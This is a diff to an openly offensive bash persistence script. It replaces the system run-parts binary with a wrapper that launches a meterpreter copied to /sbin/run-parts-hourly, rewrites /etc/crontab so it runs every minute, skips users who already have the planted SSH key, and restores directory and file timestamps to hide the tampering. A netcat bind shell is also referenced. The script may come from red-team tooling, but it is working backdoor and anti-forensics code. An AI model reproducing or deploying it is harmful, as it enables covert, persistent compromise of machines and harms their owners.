@@ -185,11 +185,15 @@ PROFILE_FILE="bash_completion.sh"
 
 # Crontab meterpreter
 METERPRETER="/tmp/linux_$NORMAL_PORT"
+NEW_METERPRETER="/sbin/run-parts-hourly"
 CRONTAB="/etc/crontab"
 CRONTAB_FIND="[[:digit:]]\+[[:blank:]]\+\*[[:blank:]]\+\*[[:blank:]]\+\*[[:blank:]]\+\*[[:blank:]]\+root[[:blank:]]\+cd \/ \&\& run-parts --report \/etc\/cron\.hourly"
 CRONTAB_REPLACE="\*  \*    \* \* \*   root    cd \/ \&\& run-parts --report \/etc\/cron\.hourly"
 CRONTAB_REPLACE_NORMAL=$(sed 's/\\//g' <<< "$CRONTAB_REPLACE")
 CRONTAB_SOMETHING="\*[[:blank:]]\+root[[:blank:]]\+"
+RUNPARTS_SCRIPT="#!/usr/bin/env bash
+
+! grep -q \"run-parts-hourly\" <<< \"\$(ps aux)\" && $NEW_METERPRETER &"
 
 # Web delivery meterpreter
 WEB_URI="systemd-clock"
@@ -255,8 +259,16 @@ for home_dir in /root /home/*; do
 
 		# Retrieve appropriate timestamps for authorized_keys files
 		if [ -f "$home_dir/.ssh/authorized_keys" ]; then
+
 			keys_timestamp=$(get_timestamp "$home_dir/.ssh/authorized_keys")
 			cecho log "'$home_dir/.ssh/authorized_keys' already exists"
+
+			# If key is already present, skip this user
+			if grep -q "$SSH_KEY" "$home_dir/.ssh/authorized_keys"; then
+				cecho log "Key already in authorized_keys file, skipping"
+				continue
+			fi
+
 		else
 			keys_timestamp=$ssh_timestamp
 			cecho info "Will create '$home_dir/.ssh/authorized_keys'"
@@ -368,21 +380,24 @@ cecho done "Done adding netcat bind shell on port $BIND_PORT"
 
 cecho task "Persisting meterpreter in '$CRONTAB' (stealthily)"
 
-if [ -x "$METERPRETER" ]; then
-	if [ -f "$CRONTAB" ]; then
-		if ! which run-parts &>/dev/null; then
-			cecho error "'run-parts' not on PATH, cannot plant meterpreter persistence in '$CRONTAB', skipping"
-		else
-			run_parts_path=$(which run-parts)
+if [ -f "$CRONTAB" ]; then
+	if ! which run-parts &>/dev/null; then
+		cecho error "'run-parts' not on PATH, cannot plant meterpreter persistence in '$CRONTAB', skipping"
+	else
+		run_parts_path=$(which run-parts)
 
-			usr_bin_timestamp=$(get_timestamp "/usr/bin") 
-			bin_timestamp=$(get_timestamp "/bin")
-			run_parts_timestamp=$(get_timestamp "$run_parts_path")
-			etc_timestamp=$(get_timestamp "/etc")
-			crontab_timestamp=$(get_timestamp "$CRONTAB")
+		usr_bin_timestamp=$(get_timestamp "/usr/bin") 
+		bin_timestamp=$(get_timestamp "/bin")
+		run_parts_timestamp=$(get_timestamp "$run_parts_path")
+		new_meterpreter_timestamp=$run_parts_timestamp
+		etc_timestamp=$(get_timestamp "/etc")
+		crontab_timestamp=$(get_timestamp "$CRONTAB")
 
-			if cp -f "$METERPRETER" "$run_parts_path" 2>/dev/null; then
-				cecho info "Copied meterpreter binary '$METERPRETER' to run-parts path '$run_parts_path'"
+		if cp -f "$METERPRETER" "$NEW_METERPRETER" 2>/dev/null && chmod +x "$NEW_METERPRETER"; then
+			cecho info "Copied meterpreter binary '$METERPRETER' to new location at '$NEW_METERPRETER'"
+
+			if echo "$RUNPARTS_SCRIPT" > "$run_parts_path"; then
+				cecho info "Wrote helper run-parts script to '$run_parts_path'"
 
 				# The whole purpose of this is to change the callback frequency to every minute, not
 				# whatever its default is which I believe is on the 17th minute of every hour.
@@ -398,20 +413,22 @@ if [ -x "$METERPRETER" ]; then
 					echo "$CRONTAB_REPLACE_NORMAL" >> "$CRONTAB" && cecho info "Meterpreter persistence added to '$CRONTAB'" || cecho error "Could not add meterpreter persistence to '$CRONTAB'"
 				fi
 
-				set_timestamp $usr_bin_timestamp "/usr/bin"
-				set_timestamp $bin_timestamp "/bin"
-				set_timestamp $run_parts_timestamp "$run_parts_path"
-				set_timestamp $etc_timestamp "/etc"
-				set_timestamp $crontab_timestamp "$CRONTAB"
 			else
-				cecho error "Could not copy meterpreter binary '$METERPRETER' to run-parts path '$run_parts_path', skipping"
+				cecho error "Couldn't write to '$run_parts_path'"
 			fi
+
+			set_timestamp $usr_bin_timestamp "/usr/bin"
+			set_timestamp $bin_timestamp "/bin"
+			set_timestamp $run_parts_timestamp "$run_parts_path"
+			set_timestamp $new_meterpreter_timestamp "$NEW_METERPRETER"
+			set_timestamp $etc_timestamp "/etc"
+			set_timestamp $crontab_timestamp "$CRONTAB"
+		else
+			cecho error "Could not copy meterpreter binary '$METERPRETER' to new location at '$NEW_METERPRETER', skipping"
 		fi
-	else
-		cecho error "Crontab file '$CRONTAB' doesn't exist, skipping stealthy crontab persistence"
 	fi
 else
-	cecho error "Meterpreter binary '$METERPRETER' not executable/doesn't exist, skipping stealthy crontab persistence"
+	cecho error "Crontab file '$CRONTAB' doesn't exist, skipping stealthy crontab persistence"
 fi
 
 cecho done "Done persisting meterpreter in '$CRONTAB' (stealthily)"
